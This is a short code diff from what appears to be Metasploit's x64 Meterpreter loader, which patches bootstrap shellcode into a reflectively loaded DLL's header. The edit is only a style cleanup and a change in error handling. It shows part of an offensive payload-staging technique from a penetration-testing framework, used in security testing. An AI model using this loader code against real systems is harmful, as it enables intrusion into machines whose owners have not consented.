@@ -74,9 +74,9 @@ module Payload::Windows::MeterpreterLoader_x64
     dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll'))
 
     asm_opts = {
-      :rdi_offset => offset,
-      :length     => dll.length,
-      :stageless  => stageless
+      rdi_offset: offset,
+      length:     dll.length,
+      stageless:  stageless
     }
 
     asm = asm_invoke_metsrv(asm_opts)
@@ -85,9 +85,8 @@ module Payload::Windows::MeterpreterLoader_x64
     bootstrap = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
-    if( bootstrap.length > 62 )
-      print_error( "Meterpreter loader (x64) generated an oversized bootstrap!" )
-      return
+    if bootstrap.length > 62
+      raise RuntimeError, "Meterpreter loader (x64) generated an oversized bootstrap!"
     end
 
     # patch the bootstrap code into the dll's DOS header...
